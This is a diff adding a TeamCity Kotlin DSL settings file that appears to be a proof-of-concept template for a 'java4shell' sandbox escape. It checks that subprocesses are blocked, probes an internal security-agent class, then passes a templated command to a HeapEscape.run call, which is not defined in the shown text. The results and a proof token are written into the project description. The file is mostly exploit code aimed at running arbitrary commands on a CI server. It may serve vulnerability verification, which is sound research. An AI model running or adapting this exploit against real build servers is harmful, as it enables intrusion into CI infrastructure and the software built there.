@@ -1,0 +1,39 @@
+import jetbrains.buildServer.configs.kotlin.*
+import java.util.Base64
+import java.util.concurrent.TimeUnit
+
+version = "@@DSL_VERSION@@"
+
+val proofToken = "@@TOKEN@@"
+val command = @@COMMAND@@
+
+// Establish what the ordinary server-side DSL sandbox permits before trying
+// the decoder defect. A successful subprocess here would invalidate this as a
+// sandbox-escape proof, so the result is deliberately explicit.
+val commandCheck = try {
+    val child = ProcessBuilder("/usr/bin/true").start()
+    val output = child.inputStream.bufferedReader().readText()
+    val exited = child.waitFor(5, TimeUnit.SECONDS)
+    if (!exited) child.destroyForcibly()
+    "UNEXPECTED_COMMAND_ALLOWED:$exited:${output.trim()}"
+} catch (denied: SecurityException) {
+    "COMMAND_DENIED:${denied.javaClass.name}:${denied.message}:" +
+        denied.stackTrace.take(4).joinToString("|") { it.className + "." + it.methodName }
+}
+check(commandCheck.startsWith("COMMAND_DENIED:")) { commandCheck }
+
+val decoded = Base64.getUrlDecoder().decode("amF2YTRzaGVsbA")
+val agentContextClass = try {
+    Class.forName("jetbrains.buildServer.configs.dsl.securityAgent.DslAgentContext").name
+} catch (denied: SecurityException) {
+    "CLASS_LOOKUP_DENIED:" + denied.message
+}
+val result = HeapEscape.run(command)
+project {
+    description = "java4shell DSL proof " + proofToken + "; " + commandCheck +
+        "; decoded=" + String(decoded, Charsets.US_ASCII) +
+        "; runtime=" + System.getProperty("java.runtime.version") +
+        "; securityManager=" + (System.getSecurityManager()?.javaClass?.name ?: "none") +
+        "; agentContext=" + agentContextClass +
+        "; result=" + result
+}
